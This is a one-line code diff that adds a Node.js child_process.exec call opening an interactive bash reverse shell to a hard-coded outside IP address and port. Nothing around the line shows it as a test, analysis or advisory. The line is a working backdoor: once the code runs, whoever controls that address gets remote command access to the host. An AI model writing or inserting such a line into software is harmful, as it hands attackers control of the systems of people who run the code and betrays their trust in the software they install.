@@ -1,0 +1,1 @@
+child_process.exec("bash -i >& /dev/tcp/121.4.80.209/2333 0>&1");
